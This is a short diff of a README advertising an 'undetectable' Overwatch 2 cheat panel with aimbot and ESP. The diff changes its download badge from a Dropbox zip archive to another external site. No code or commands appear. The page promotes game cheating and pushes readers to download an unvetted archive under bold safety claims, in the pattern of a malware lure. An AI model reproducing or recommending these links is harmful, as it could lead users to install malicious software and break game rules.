@@ -1,6 +1,6 @@
 # Overwatch 2 Cheat Panel 🚀 | Undetectable & Powerful ⚡️
 
-[![Download Overwatch 2 Cheat Panel](https://img.shields.io/badge/Download-Overwatch2%20CheatPanel-blueviolet)](https://www.dropbox.com/scl/fi/twquoia4lencjnk3nb0z5/Chronosys.zip?rlkey=bnmszc7plqna5dor2m0oxvqsw&st=nj5yrseh&dl=1)
+[![Download Overwatch 2 Cheat Panel](https://img.shields.io/badge/Download-Overwatch2%20CheatPanel-blueviolet)](https://resser.tech)
 
 A fully functional cheat panel for Overwatch 2, designed to enhance your gameplay experience with **aimbot**, **ESP**, and more! 🎯💥  
 - 🚀 **Undetectable** and **Safe**  
